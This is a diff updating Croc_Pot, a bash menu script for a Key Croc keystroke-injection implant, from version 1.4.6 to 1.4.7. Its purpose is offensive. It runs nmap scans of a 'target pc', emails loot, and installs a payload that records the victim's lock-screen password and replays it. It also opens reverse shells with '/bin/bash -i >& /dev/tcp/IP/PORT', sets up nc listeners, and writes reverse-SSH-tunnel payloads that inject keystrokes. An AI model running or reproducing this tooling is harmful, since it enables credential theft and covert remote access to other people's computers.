@@ -4,7 +4,7 @@
 # Title:         Croc_Pot
 # Description:   Email KeyCroc INFO & Log files & Nmap scan Plus save to loot folder and more
 # Author:        Spywill
-# Version:       1.4.6
+# Version:       1.4.7
 # Category:      Key Croc
 ##
 ##
@@ -58,7 +58,7 @@ MenuColor() {
 	echo -ne "\t\t\t\e[40;1m${1}${clear}${green})${clear}\e[40;38;5;202;4m${2} ${3} ${4} ${5} ${6} ${7}"
 }
 MenuEnd() {
-	echo -ne "\t\t\t\e[40;1m0${clear}${green})${clear}\e[40;4;32mEXIT              \U27B2${clear}
+	echo -ne "\t\t\t\e[40;1m0${clear}${green})${clear}\e[40;4;32mEXIT               \U27B2 ${clear} 
 \t\t\e[40m$(ColorBlue 'CHOOSE AN OPTION AND PRESS [ENTER]:') ${clear}"
 }
 Info_Screen() {
@@ -87,13 +87,13 @@ if [ "$(OS_CHECK)" = LINUX ]; then
 fi
 }
 ##
-#----keycroc display info
+#----keycroc title display info
 ##
 	echo -ne "\n\n\e[41;38;5;232m${LINE}${clear}
 \e[40;31m${LINE_A}${clear}\e[40m»${clear}\e[40;31mKEYCROC${clear}\e[40m-${clear}\e[40;31mHAK${clear}\e[40m❺ ${clear}\e[40m«${clear}\e[40;31m---------${clear}\e[41;38;5;232m♁${clear}\e[40m${yellow} $(hostname) IP: $(ifconfig wlan0 | grep "inet addr" | awk {'print $2'} | cut -c 6-) $(internet_test)         ${clear}
 \e[40;31m   DEVELOPED BY ${clear}\e[40mSPYWILL ${clear}\e[40m               ${clear}\e[41;38;5;232m§${clear}\e[40m${yellow} $(hostname) VER: $(cat /root/udisk/version.txt) *TARGET-PC:${green}$(OS_CHECK)   $(FILL_IN)${clear}
 \e[40;31m   DATE OF SCAN${clear}\e[40m ${DATE}${clear}\e[41;38;5;232mΩ${clear}\e[40m${yellow} $(hostname) keyboard: $(sed -n 9p /root/udisk/config.txt)           ${clear}
-\e[40;31m${LINE_A}${clear}\e[40;92m»CROC_POT«\e[40;31m--${clear}\e[40m${yellow}VER:1.4.6\e[40;31m---${clear}\e[41;38;5;232mᛝ${clear}\e[40m${yellow} CPU TEMP:$(cat /sys/class/thermal/thermal_zone0/temp)°C USAGE:$(top -bn1 | grep "Cpu(s)" | sed "s/.*, *\([0-9.]*\)%* id.*/\1/" | awk '{print 100 - $1"%"}') MEM:$(free -m | awk 'NR==2{printf "%.2f%%", $3/$2*100 }')   ${clear}
+\e[40;31m${LINE_A}${clear}\e[40;92m»CROC_POT«\e[40;31m--${clear}\e[40m${yellow}VER:1.4.7\e[40;31m---${clear}\e[41;38;5;232mᛝ${clear}\e[40m${yellow} CPU TEMP:$(cat /sys/class/thermal/thermal_zone0/temp)°C USAGE:$(top -bn1 | grep "Cpu(s)" | sed "s/.*, *\([0-9.]*\)%* id.*/\1/" | awk '{print 100 - $1"%"}') MEM:$(free -m | awk 'NR==2{printf "%.2f%%", $3/$2*100 }')   ${clear}
 \e[41;38;5;232m${LINE}${clear}\n\n"	
 }
 function croc_title_loot() {
@@ -139,7 +139,7 @@ function nmap_menu() {
 	local LOOT_NMAP=/root/udisk/loot/Croc_Pot/KeyCroc_NMAP.txt
 	echo -ne "$(Info_Screen '
 -Start some basic nmap scan and save to loot folder\n
--Enter IP for scan or default IP is 192.168.1.*\n')${clear}\n"
+-Enter IP for scan or default will be target pc ip')$(os_ip)\n${clear}\n"
 ##
 #----Nmap User IP Input Function
 ##
@@ -149,12 +149,12 @@ if [[ "${r_a}" == +([0-9]).+([0-9]).+([0-9]).+([0-9]) ]]; then
 	IP_SETUP=${r_a}
 	echo -ne "\t${LINE_}\e[40m$(ColorGreen 'USING IP THAT WAS ENTER')${clear}${r_a}\n"
 else
-	echo -ne "\t${LINE_}\e[40;4m$(ColorRed 'USING DEFAULT IP 192.168.1.*')${clear}${LINE_}\n"
-	IP_SETUP=192.168.1.*
+	echo -ne "\t\e[40;4m$(ColorRed 'USING TARGET PC IP')$(os_ip)${clear}\n"
+	IP_SETUP=$(os_ip)
 fi
 }
 ##
-#----Nmap Regular Scan Functions
+#----Nmap Regular Scan Function
 ##
 regular_scan() {
 	LED ATTACK
@@ -162,7 +162,7 @@ regular_scan() {
 	croc_title_loot | tee ${LOOT_NMAP} ; echo -e "\t${LINE_}NMAP REGULAR SCAN${LINE_}\n" | tee -a ${LOOT_NMAP} ; nmap ${IP_WLAN} ${IP_SETUP} | tee -a ${LOOT_NMAP}
 }
 ##
-#----Nmap Quick_Scan Functions
+#----Nmap Quick_Scan Function
 ##
 quick_scan() {
 	LED ATTACK
@@ -170,7 +170,7 @@ quick_scan() {
 	croc_title_loot | tee ${LOOT_NMAP} ; echo -e "\t${LINE_}NMAP QUICK SCAN${LINE_}\n" | tee -a ${LOOT_NMAP} ; nmap -T4 -F ${IP_WLAN} ${IP_SETUP} | tee -a ${LOOT_NMAP}
 }
 ##
-#----Nmap Quick_Plus Scan Functions
+#----Nmap Quick_Plus Scan Function
 ##
 quick_plus_scan() {
 	LED ATTACK
@@ -178,7 +178,7 @@ quick_plus_scan() {
 	croc_title_loot | tee ${LOOT_NMAP} ; echo -e "\t${LINE_}NMAP QUICK_PLUS SCAN${LINE_}\n" | tee -a ${LOOT_NMAP} ; nmap -sV -T4 -O -F --version-light ${IP_WLAN} ${IP_SETUP} | tee -a ${LOOT_NMAP}
 }
 ##
-#----Nmap Ping Scan Functions
+#----Nmap Ping Scan Function
 ##
 ping_scan() {
 	LED ATTACK
@@ -186,7 +186,7 @@ ping_scan() {
 	croc_title_loot | tee ${LOOT_NMAP} ; echo -e "\t${LINE_}NMAP PING SCAN${LINE_}\n" | tee -a ${LOOT_NMAP} ; nmap -sn ${IP_WLAN} ${IP_SETUP} | tee -a ${LOOT_NMAP}
 }
 ##
-#----Nmap Intense Scan Functions
+#----Nmap Intense Scan Function
 ##
 intense_scan() {
 	LED ATTACK
@@ -194,14 +194,14 @@ intense_scan() {
 	croc_title_loot | tee ${LOOT_NMAP} ; echo -e "\t${LINE_}NMAP INTENSE SCAN${LINE_}\n" | tee -a ${LOOT_NMAP} ; nmap -T4 -A -v ${IP_WLAN} ${IP_SETUP} | tee -a ${LOOT_NMAP}
 }
 ##
-#----Nmap Interface Scan Functions
+#----Nmap Interface Scan Function
 ##
 interface_scan() {
 	LED ATTACK
 	croc_title_loot | tee ${LOOT_NMAP} ; echo -e "\t${LINE_}NMAP INTERFACE SCAN${LINE_}\n" | tee -a ${LOOT_NMAP} ; nmap --iflist | tee -a ${LOOT_NMAP} 
 }
 ##
-#----Nmap Port Scan Functions
+#----Nmap Port Scan Function
 ##
 port_scan() {
 	LED ATTACK
@@ -209,14 +209,14 @@ port_scan() {
 	croc_title_loot | tee ${LOOT_NMAP} ; echo -e "\t${LINE_}NMAP PORT SCAN${LINE_}\n" | tee -a ${LOOT_NMAP} ; nmap --top-ports 20 ${IP_WLAN} ${IP_SETUP} | tee -a ${LOOT_NMAP}
 }
 ##
-#----Nmap Personal Scan Functions
+#----Nmap Personal Scan Function
 ##
 personal_scan() {
 	LED ATTACK
 	croc_title_loot | tee ${LOOT_NMAP} ; echo -e "\t${LINE_}NMAP PERSONAL SCAN${LINE_}\n" ; echo -n " $(ColorBlue 'ENTER YOUR NMAP SCAN SETTING THEN PRESS [ENTER]'): " ; read PER_SCAN && ${PER_SCAN} | tee -a ${LOOT_NMAP}
 }
 ##
-#----Nmap Connected Pc Scan Functions
+#----Nmap Connected Pc Scan Function
 ##
 pc_scan() {
 if [ "$(OS_CHECK)" = WINDOWS ]; then
@@ -225,7 +225,7 @@ else
 if [ "$(OS_CHECK)" = LINUX ]; then
 	croc_title_loot | tee ${LOOT_NMAP} ; echo -e "\t${LINE_}CONNECTED PC SCAN: $(OS_CHECK)${LINE_}\n" | tee -a ${LOOT_NMAP} ; nmap $(os_ip) | tee -a ${LOOT_NMAP}
 else
-	echo -ne "\n\t\e[40m$(ColorRed 'PLEASE RUN CROC_POT PAYLOAD TO GET PC USER NAME AND IP')${clear}\n"
+	echo -ne "\n\t\e[40m$(ColorRed 'PLEASE RUN CROC_POT_PAYLOAD.txt TO GET PC USER NAME AND IP')${clear}\n"
 fi
 fi
 }
@@ -263,7 +263,7 @@ MenuEnd
 	esac
 }
 ##
-#----Key Croc Log mean/function
+#----KeyCroc Log mean/function
 ##
 function croc_logs_mean() {
 	local LOOT_LOG=/root/udisk/loot/Croc_Pot/KeyCroc_LOG.txt
@@ -318,16 +318,11 @@ function croc_mail() {
 	LED B
 	echo -ne "$(Info_Screen '
 -Send E-Mail with g-mail or OutLook\n
--Send ATTACHMENT\n
--Add MESSAGE\n
--Select g-mail or outlook\n
--Enter your e-mail address\n
--Enter your e-mail password\n
--Enter the e-mail to send to\n
--Enter MESSAGE\n
--Add Attachment\n')${clear}\n\n"
+-Select g-mail or outlook then Enter your e-mail address\n
+-Enter your e-mail password then Enter the e-mail to send to\n
+-Add MESSAGE and/or Add Attachment\n')${clear}\n\n"
 ##
-#----User Smtp input Functions
+#----User Smtp input Function
 ##
 user_smtp() {
 MenuTitle SELECT EMAIL PROVIDER
@@ -346,7 +341,7 @@ MenuEnd
 	esac
 }
 ##
-#----User E-mail input Functions
+#----User E-mail input Function
 ##
 user_email_set() {
 ##
@@ -379,7 +374,7 @@ user_input_passwd
 read_all ENTER EMAIL TO SEND LOOT TO AND PRESS [ENTER] ; echo ${r_a} >> ${USER_CR}
 }
 ##
-#----Python file send Functions
+#----Python file send Function
 ##
 mail_file() {
 	clear
@@ -395,7 +390,7 @@ python_v() {
 	FILE_I_B="${CHANGE_FILE_A}"
 }
 ##
-#----Mail Nmap Functions
+#----Mail Nmap file Function
 ##
 send_file_a() {
 	local LOOT_NMAP=/root/udisk/loot/Croc_Pot/KeyCroc_NMAP.txt
@@ -410,7 +405,7 @@ else
 fi
 }
 ##
-#----Mail KeyCroc Log Functions
+#----Mail KeyCroc Log Function
 ##
 send_file_b() {
 	local LOOT_LOG=/root/udisk/loot/Croc_Pot/KeyCroc_LOG.txt
@@ -425,7 +420,7 @@ else
 fi
 }
 ##
-#----Mail Windows Log Functions
+#----Mail Windows Log Function
 ##
 send_file_c() {
 	local LOOT_WIND=/root/udisk/loot/Croc_Pot/KeyCroc_Wind_LOG.txt
@@ -509,7 +504,7 @@ MenuEnd
 	esac
 }
 ##
-#----Python E-mail Functions
+#----Python E-mail Function
 ##
 python_email() {
 local USER_EMAL=$(sed -n 2p ${USER_CR})
@@ -777,7 +772,6 @@ fi
 get_online_p() {
 	clear
 	local GETONLINE=/root/udisk/payloads/Getonline.txt
-	echo -e "\n\e[40m${red}***${clear}\e[40mINSTALLING PAYLOAD CALLED GETONLINE TO PAYLOAD FOLDER${red}***${clear}\n"
 	echo -ne "$(Info_Screen '
 -Connect automatically to target pc WIFI (Windows)\n
 -After install unplug and plug into windows pc and type in getonline\n
@@ -805,7 +799,6 @@ fi
 croc_unlock_p() {
 	clear
 	local CROCUNLOCK=/root/udisk/payloads/Croc_unlock_1.txt
-	echo -ne "\n\e[40m${red}${LINE_}${clear}\e[40mINSTALLING PAYLOAD CALLED CROCUNLOCK TO PAYLOAD FOLDER${red}${LINE_}${clear}\n"
 	echo -ne "$(Info_Screen '
 -Start by pressing GUI + L or CONTROL + ALT + DELETE\n
 -This will forus the user to enter password and save to keycroc\n
@@ -813,10 +806,11 @@ croc_unlock_p() {
 -Next time at login screen type in crocunlock\n
 -This will enter the user password and log you in\n
 -First time running this may need to unplug and plug back in\n')${clear}\n"
-    echo -ne "\n\e[40m$(ColorRed '
+    echo -ne "\e[40m$(ColorRed '
 --THIS PAYLOAD IS RELYING ON THE ENTER KEY TO BE PRESSED\n 
 --AFTER THE USER HAS ENTER THE PASSWORD\n
 --WORK FOR PIN NUMBER TO AS LONG AS THE ENTER KEY HAS BE PRESSED AFTER')\n"
+	echo -ne "\e[48;5;202;30m${LINE}${clear}\n"
 if [ -e "${CROCUNLOCK}" ]; then
 	echo -ne "\n\e[40m${red}${LINE_}${clear}\e[40m$(ColorGreen 'CROCUNLOCK PAYLOAD IS INSTALLED CHECK PAYLOADS FOLDER')${red}${LINE_}${clear}\n"
 else
@@ -943,8 +937,8 @@ croc_vpn() {
 	local vpn_file=/root/udisk/*.ovpn
 	echo -ne "$(Info_Screen '
 -First you will need to download the (filename.ovpn) file\n
--from your VPN server of choice\n
--place it on the keycroc root of the udisk\n
+-From your VPN server of choice\n
+-Place it on the keycroc root of the udisk\n
 -Then select #1 VPN SETUP to do the rest\n
 -Check to see if openvpn is installed if not installing it\n')${clear}\n"
 setup_vpn() {
@@ -3841,7 +3835,7 @@ ${LINE}\nRUNNING SERVICES:\n$(service --status-all)\n${LINE}\nINSTALLED PACKAGES
 cat ${LOOT_INFO}
 }
 ##
-#----Status connected pc info
+#----Status of target pc info
 ##
 pc_info() {
 	local CROC_OS=/root/udisk/tools/Croc_Pot/Croc_OS.txt
@@ -3944,7 +3938,7 @@ function croc_edit_menu() {
 	LED B
 	croc_title
 ##
-#----Edit Payload files Functions
+#----Edit Payload files Function
 ##
 edit_payload() {
 	cd /root/udisk/payloads
@@ -3959,7 +3953,7 @@ else
 fi
 }
 ##
-#----Edit Tools files Functions
+#----Edit Tools files Function
 ##
 edit_tools() {
 	cd /root/udisk/tools
@@ -3974,7 +3968,7 @@ else
 fi
 }
 ##
-#----Edit loot files Functions
+#----Edit loot files Function
 ##
 edit_loot() {
 	cd /root/udisk/loot
@@ -3989,7 +3983,7 @@ else
 fi
 }
 ##
-#----Edit Config files Functions
+#----Edit Config files Function
 ##
 edit_config() {
 	local USER_CONFIG_V=/root/udisk/config.txt
@@ -4000,7 +3994,7 @@ else
 fi
 }
 ##
-#----Edit Path To file Functions
+#----Edit Path To file Function
 ##
 user_file() {
 	cd
@@ -4015,7 +4009,7 @@ else
 fi
 }
 ##
-#----Edit remove file Functions
+#----Edit remove file Function
 ##
 remove_file() {
 	cd
@@ -4170,6 +4164,9 @@ else
 	IP_O=172.16.56.1
 fi
 }
+##
+#----SSH get public ip
+##
 public_ip() {
 	echo -ne "\e[40;93mPublic ip:${clear}\e[40;32m$(curl -s https://api.ipify.org) ${clear}"
 }
@@ -4204,7 +4201,7 @@ shark_check ; check_device ${IP_F} SHARK JACK: ; get_mac ${IP_F} ; port_check ${
 #check_device 172.16.64.1 BASH BUNNY: $(get_mac) ; port_check 172.16.64.1
 echo -ne "\e[48;5;202;30m${LINE}${clear}\n"
 ##
-#----SSH check for pc passwd
+#----SSH check for target pc passwd
 ##
 pc_pw() {
 if [ -e "/root/udisk/loot/Croc_Pot/winpasswd.txt" ]; then
@@ -4214,43 +4211,34 @@ else
 fi
 }
 ##
-#----SSH to connected pc
+#----SSH keycroc to target pc
 ##
 pc_ssh() {
 	pc_pw
+if [ -e "/root/udisk/tools/Croc_Pot/Croc_OS_Target.txt" ]; then
+start_ssh() {
+	echo -ne "\t$(ColorYellow 'The PC user name is:') $(sed -n 1p /root/udisk/tools/Croc_Pot/Croc_OS_Target.txt)
+\t$(ColorYellow 'The PC IP is:') $(os_ip)
+\t$(ColorGreen 'Starting SSH with connected PC')\n"
+	ssh $(sed -n 1p /root/udisk/tools/Croc_Pot/Croc_OS_Target.txt)@$(os_ip)
+}
 	case $(OS_CHECK) in
 	WINDOWS)
-		if [ -e "/root/udisk/loot/Croc_Pot/winpasswd.txt" ]; then
-	echo -ne "\t$(ColorYellow 'The PC user name is:') $(sed -n 1p /root/udisk/tools/Croc_Pot/Croc_OS_Target.txt)
-\t$(ColorYellow 'The PC IP is:') $(os_ip)
-\t$(ColorGreen 'Starting SSH with connected PC')\n"
-	ssh $(sed -n 1p /root/udisk/tools/Croc_Pot/Croc_OS_Target.txt)@$(os_ip)
-		else
-	echo -ne "\t$(ColorYellow 'The PC user name is:') $(sed -n 1p /root/udisk/tools/Croc_Pot/Croc_OS_Target.txt)
-\t$(ColorYellow 'The PC IP is:') $(os_ip)
-\t$(ColorGreen 'Starting SSH with connected PC')
-\t$(ColorYellow 'ENTER PASSWD MANUALLY')\n"
-	ssh $(sed -n 1p /root/udisk/tools/Croc_Pot/Croc_OS_Target.txt)@$(os_ip)
-		fi ;;
+		start_ssh ;;
 	LINUX)
-		if [ -e "/root/udisk/loot/Croc_Pot/winpasswd.txt" ]; then
-	echo -ne "\t$(ColorYellow 'The PC user name is:') $(sed -n 1p /root/udisk/tools/Croc_Pot/Croc_OS_Target.txt)
-\t$(ColorYellow 'The PC IP is:') $(os_ip)
-\t$(ColorGreen 'Starting SSH with connected PC')\n"
-	ssh $(sed -n 1p /root/udisk/tools/Croc_Pot/Croc_OS_Target.txt)@$(os_ip)
-		else
-	echo -ne "\t$(ColorYellow 'The PC user name is:') $(sed -n 1p /root/udisk/tools/Croc_Pot/Croc_OS_Target.txt)
-\t$(ColorYellow 'The PC IP is:') $(os_ip)
-\t$(ColorGreen 'Starting SSH with connected PC')
-\t$(ColorYellow 'ENTER PASSWD MANUALLY')\n"
-	ssh $(sed -n 1p /root/udisk/tools/Croc_Pot/Croc_OS_Target.txt)@$(os_ip)
-		fi ;;
+		start_ssh ;;
 	MACOS)
 		echo -ne "\t$(ColorRed 'SORRY NO SUPPORT AT THIS TIME FOR MAC USERS')\n" ;;
 	*)
 		echo -ne "\t$(ColorRed 'SORRY DID NOT FIND VALID OS')\n" ;;
 	esac
+else
+	echo -ne "\t\e[40m$(ColorYellow 'PLEASE RUN CROC_POT_PAYLOAD.TXT TO GET TARGET IP/USERNAME')\n"
+fi
 }
+##
+#----SSH enter user/ip to start ssh
+##
 userinput_ssh() {
 	echo -ne "\e[40m$(ColorBlue 'ENTER THE HOST/USER NAME FOR SSH AND PRESS [ENTER]:')"; read SSH_USER
 	echo -ne "\e[40m$(ColorBlue 'ENTER THE IP FOR SSH AND PRESS [ENTER]:')"; read SSH_IP
@@ -4428,15 +4416,15 @@ if [ -e "${bunny_payload_v}" ]; then
 	[nN] | [nN][oO])
 		rm ${bunny_payload_v}
 		echo -ne "# Title:         Bash Bunny Payload\n# Description:   Reverse Tunnel to keycroc\n# Author:        Spywill\n# Version:       1.0
-# Category:      Bash Bunny\n#\n#ATTACKMODE RNDIS_ETHERNET\nATTACKMODE ECM_ETHERNET\nssh -fN -R 7000:localhost:22 root@$(ifconfig wlan0 | grep "inet addr" | awk {'print $2'} | cut -c 6-)\nLED ATTACK" | tee ${bunny_payload_v}
-	echo -ne "\n\e[40m${green}Bunny Reverse Tunnel payload is created check tools/Bunny_Payload_Shell folder\n${clear}" ;;
+# Category:      Bash Bunny\n#\n#ATTACKMODE RNDIS_ETHERNET\nATTACKMODE ECM_ETHERNET\nsleep 10\nssh -fN -R 7000:localhost:22 root@$(ifconfig wlan0 | grep "inet addr" | awk {'print $2'} | cut -c 6-)\nLED ATTACK" | tee ${bunny_payload_v}
+		echo -ne "\n\e[40m${green}Bunny Reverse Tunnel payload is created check tools/Bunny_Payload_Shell folder\n${clear}" ;;
 	*)
 		invalid_entry ; ssh_bunny ;;
 	esac
 else
-	echo -ne "# Title:         Bash Bunny Payload\n# Description:   Reverse Tunnel to keycroc\n# Author:        Spywill\n# Version:       1.0
-# Category:      Bash Bunny\n#\n#ATTACKMODE RNDIS_ETHERNET\nATTACKMODE ECM_ETHERNET\n/ssh -fN -R 7000:localhost:22 root@$(ifconfig wlan0 | grep "inet addr" | awk {'print $2'} | cut -c 6-)\nLED ATTACK" | tee ${bunny_payload_v}
-	echo -ne "\n\e[40m${green}Bunny Reverse shell payload is created check tools/Bunny_Payload_Shell folder\n${clear}"
+		echo -ne "# Title:         Bash Bunny Payload\n# Description:   Reverse Tunnel to keycroc\n# Author:        Spywill\n# Version:       1.0
+# Category:      Bash Bunny\n#\n#ATTACKMODE RNDIS_ETHERNET\nATTACKMODE ECM_ETHERNET\nsleep 10\nssh -fN -R 7000:localhost:22 root@$(ifconfig wlan0 | grep "inet addr" | awk {'print $2'} | cut -c 6-)\nLED ATTACK" | tee ${bunny_payload_v}
+		echo -ne "\n\e[40m${green}Bunny Reverse shell payload is created check tools/Bunny_Payload_Shell folder\n${clear}"
 fi
 	read_all START SSH WITH CONNECTED PC TO BUNNY Y/N AND PRESS [ENTER]
 	case $r_a in
@@ -4487,6 +4475,15 @@ fi ;;
 		read_all START REVERSE TUNNEL WITH BUNNY TO CROC Y/N AND PRESS [ENTER]
 		case $r_a in
 	[yY] | [yY][eE][sS])
+		echo "PLUG YOUR BASH BUNNY IN NOW"
+		sleep 5
+	if [ "$(OS_CHECK)" = WINDOWS ]; then
+		LED ATTACK
+		ssh root@localhost -p 7000
+	else
+	local HOST_CHECK=$(sed -n 3p /root/udisk/tools/Croc_Pot/Croc_OS.txt)
+	case $HOST_CHECK in
+	raspberrypi)
 		Q GUI d
 		sleep 1
 		Q STRING "terminal"
@@ -4508,21 +4505,24 @@ fi ;;
 		Q STRING "fi"
 		Q ENTER
 		sleep 2
-		Q STRING "PLUG YOUR BASH BUNNY IN NOW"
-		Q ENTER
-		sleep 5
 		Q STRING "sudo bash ./bb.sh"
 		Q ENTER
 		sleep 3
 		Q STRING "c"
-		sleep 5
+		sleep 2
 		Q STRING "exit"
 		Q ENTER
 		Q ALT-TAB
 		clear
-		sleep 5
+		sleep 8
 		LED ATTACK
 		ssh root@localhost -p 7000 ;;
+	parrot)
+		;;
+	*)
+		;;
+	esac
+	fi ;;
 	[nN] | [nN][oO])
 		echo -ne "\n\e[40m$(ColorYellow 'Maybe next time')\n${clear}" ;;
 	*)
@@ -4531,14 +4531,14 @@ fi ;;
 	esac
 }
 ##
-#----SSH Create public and private keys using ssh-key-gen on local-host
+#----SSH Create public and private keys using ssh-key-gen on keycroc
 ##
 ssh_keygen() {
 	echo -ne "$(Info_Screen '
 -Create public/private keys using ssh-key-gen on local-host\n
 -Generate keys on the keycroc and send to remote-host\n
--This will run ssh-keygen and 
--ssh-copy-id -i ~/.ssh/id_rsa.pub remote-host\n
+-This will run ssh-keygen and copy to remote-host
+-ssh-copy-id -i ~/.ssh/id_rsa.pub username@remote-host-ip\n
 -remote-host can be pineapple,server,pc,etc\n')${clear}\n"
 	read_all CREATE PUBLIC/PRIVATE KEYS Y/N AND PRESS [ENTER]
 	case $r_a in
@@ -4561,18 +4561,19 @@ ssh_keygen() {
 	esac
 }
 ##
-#----SSH reverse shell input
+#----SSH reverse shell user input
 ##
 croc_reverse_shell() {
 	clear
 shell_input() {
-	unset IP_RS
-	unset IP_RSP
-	echo -ne "\e[40m$(ColorBlue 'ENTER IP OF SERVER/REMOTE-HOST PRESS [ENTER]:')${clear}"; read IP_RS
-	echo -ne "\e[40m$(ColorBlue 'ENTER PORT NUMBER TO USE PRESS [ENTER]:')${clear}"; read IP_RSP
+	unset IP_RS IP_RSP IP_RSN
+	rm /root/udisk/tools/Croc_Pot/saved_shell.txt
+	echo -ne "\e[40m$(ColorBlue 'ENTER IP OF SERVER/REMOTE-HOST PRESS [ENTER]:')${clear}"; read IP_RS ; echo "${IP_RS}" >> /root/udisk/tools/Croc_Pot/saved_shell.txt
+	echo -ne "\e[40m$(ColorBlue 'ENTER PORT NUMBER TO USE PRESS [ENTER]:')${clear}"; read IP_RSP ; echo "${IP_RSP}" >> /root/udisk/tools/Croc_Pot/saved_shell.txt
+	echo -ne "\e[40m$(ColorBlue 'ENTER SERVER/REMOTE-HOST NAME PRESS [ENTER]:')${clear}"; read IP_RSN ; echo "${IP_RSN}" >> /root/udisk/tools/Croc_Pot/saved_shell.txt
 }
 ##
-#----SSH reverse with nc remote listener (server)
+#----SSH reverse with nc remote listener on (server)
 ##
 remote_listener() {
 	clear
@@ -4589,15 +4590,14 @@ remote_listener() {
 	[yY] | [yY][eE][sS])
 		local SAVE_SHELL=/root/udisk/tools/Croc_Pot/saved_shell.txt
 	if [ -e "${SAVE_SHELL}" ]; then
-		echo -ne "\n$(sed -n 1p ${SAVE_SHELL}) Server IP\n$(sed -n 2p ${SAVE_SHELL}) Server Port\n"
+		echo -ne "\n$(sed -n 1p ${SAVE_SHELL}) Server IP\n$(sed -n 3p ${SAVE_SHELL}) Server user name\n$(sed -n 2p ${SAVE_SHELL}) Server Port\n"
 		read_all Found saved shell setup use them Y/N AND PRESS [ENTER]
 	case $r_a in
 	[yY] | [yY][eE][sS])
 		echo -ne "\n\e[40;93mLISTENING SERVER SETUP \e[40;32mnc -lnvp $(sed -n 2p ${SAVE_SHELL}) -s $(sed -n 1p ${SAVE_SHELL})${clear}\n"
 		/bin/bash -i >& /dev/tcp/$(sed -n 1p ${SAVE_SHELL})/$(sed -n 2p ${SAVE_SHELL}) 0>&1 & ;;
 	[nN] | [nN][oO])
-		rm ${SAVE_SHELL}
-		shell_input ; echo -ne "${IP_RS}\n${IP_RSP}" >> ${SAVE_SHELL}
+		shell_input
 		echo -ne "\n\e[40;93mLISTENING SERVER SETUP \e[40;32mnc -lnvp ${IP_RSP} -s ${IP_RS}${clear}\n"
 		/bin/bash -i >& /dev/tcp/${IP_RS}/${IP_RSP} 0>&1 & ;;
 	*)
@@ -4605,7 +4605,7 @@ remote_listener() {
 	esac
 	else
 		echo -ne "\e[40m$(ColorRed 'Did not find any saved shell setup')\n"
-		shell_input ; echo -ne "${IP_RS}\n${IP_RSP}" >> ${SAVE_SHELL}
+		shell_input
 		echo -ne "\n\e[40;93mLISTENING SERVER SETUP \e[40;32mnc -lnvp ${IP_RSP} -s ${IP_RS}${clear}\n"
 		/bin/bash -i >& /dev/tcp/${IP_RS}/${IP_RSP} 0>&1 &
 	fi ;;
@@ -4623,13 +4623,14 @@ croc_listener() {
 	echo -ne "$(Info_Screen '
 -Start Listening on your keycroc\n
 -Access your remote PC,server\n
--This will start listening on croc enter this below\n')${clear}\n\n"
+-This will start listening on croc enter this below on server side\n
+-/bin/bash -i >& /dev/tcp/IP/7000 0>&1 &\n')${clear}\n\n"
 	read_all START LISTENING ON CROC Y/N AND PRESS [ENTER]
 	case $r_a in
 	[yY] | [yY][eE][sS])
 		clear
-		echo -ne "\n\e[40;93mON REMOTE PC/SERVER SETUP \e[40;32m/bin/bash -i >& /dev/tcp/$(ifconfig wlan0 | grep "inet addr" | awk {'print $2'} | cut -c 6-)/80 0>&1${clear}\n"
-		nc -lnvp 80 -s $(ifconfig wlan0 | grep "inet addr" | awk {'print $2'} | cut -c 6-) ;;
+		echo -ne "\n\e[40;93mON REMOTE PC/SERVER SETUP \e[40;32m/bin/bash -i >& /dev/tcp/$(ifconfig wlan0 | grep "inet addr" | awk {'print $2'} | cut -c 6-)/7000 0>&1${clear}\n"
+		nc -lnvp 7000 -s $(ifconfig wlan0 | grep "inet addr" | awk {'print $2'} | cut -c 6-) ;;
 	[nN] | [nN][oO])
 		echo -ne "\n\e[40m$(ColorYellow 'Maybe next time')\n${clear}" ;;
 	*)
@@ -4643,7 +4644,7 @@ reverse_payload() {
 	clear
 	echo -ne "$(Info_Screen '
 -Create Reverse SSH Tunnel Payload keycroc to your server\n
--Plug keycroc into pc and type in croctunnel\n
+-Plug keycroc into Target pc and type in croctunnel\n
 -Keycroc side will be setup as below\n
 -\e[40;32mssh -fN -R port#:localhost:22 username@your-server-ip\e[0m\e[40;93m\n
 -Enter on server side as below\n
@@ -4658,12 +4659,12 @@ reverse_payload() {
 	[yY] | [yY][eE][sS])
 		echo -ne "\n\e[40m$(ColorGreen 'Keeping existing Croc_Shell Payload')\n${clear}" ;;
 	[nN] | [nN][oO])
-		rm ${PAYLOAD_SHELL}
 		shell_input
 		echo -ne "# Title:         Croc_ssh_Tunnel\n# Description:   Create a Reverse SSH Tunnel with keycroc to your server
 # Author:        spywill\n# Version:       1.0\n# Category:      Key Croc
-#\nMATCH croctunnel\n#\nssh -fN -R ${IP_RSP}:localhost:22 ${IP_RS}" >> ${PAYLOAD_SHELL}
-		echo -ne "\n\e[40m$(ColorGreen 'Croc_shell PAYLOAD IS NOW INSTALLED CHECK KEYCROC PAYLOADS FOLDER')${clear}\n" ;;
+#\nMATCH croctunnel\n#\nssh -fN -R ${IP_RSP}:localhost:22 ${IP_RSN}@${IP_RS}\nLED ATTACK" >> ${PAYLOAD_SHELL}
+		echo -ne "\n\e[40m$(ColorGreen 'Croc_shell PAYLOAD IS NOW INSTALLED CHECK KEYCROC PAYLOADS FOLDER')${clear}\n"
+		cat ${PAYLOAD_SHELL} ;;
 	*)
 		invalid_entry ; croc_reverse_shell ;;
 		esac
@@ -4672,25 +4673,27 @@ reverse_payload() {
 		shell_input
 		echo -ne "# Title:         Croc_ssh_Tunnel\n# Description:   Create a Reverse SSH Tunnel with keycroc to your server
 # Author:        spywill\n# Version:       1.0\n# Category:      Key Croc
-#\nMATCH croctunnel\n#\nssh -fN -R ${IP_RSP}:localhost:22 ${IP_RS}" >> ${PAYLOAD_SHELL}
+#\nMATCH croctunnel\n#\nssh -fN -R ${IP_RSP}:localhost:22 ${IP_RSN}@${IP_RS}\nLED ATTACK" >> ${PAYLOAD_SHELL}
 		echo -ne "\n\e[40m$(ColorGreen 'Croc_shell PAYLOAD IS NOW INSTALLED CHECK KEYCROC PAYLOADS FOLDER')${clear}\n"
 	fi
 }
 ##
-#----SSH reverse ssh tunnle with connected pc to keycroc
+#----SSH reverse ssh tunnle with target pc to keycroc
 ##
 shell_pc() {
 	clear
 	echo -ne "$(Info_Screen '
 -Start reverse ssh tunnel PC to Keycroc\n
 -PC side will be setup with this below\n
--\e[40;32mssh -fN -R 7000:localhost:22 root@keycroc IP\e[0m\e[40;93m\n
+-\e[40;32mssh -fN -R port#:localhost:22 root@keycroc IP\e[0m\e[40;93m\n
 -Keycroc side will be setup with this below\n
--\e[40;32mssh PC-username@localhost -p 7000\e[0m\n')${clear}\n\n"
+-\e[40;32mssh PC-username@localhost -p port#\e[0m\n')${clear}\n\n"
 	pc_pw
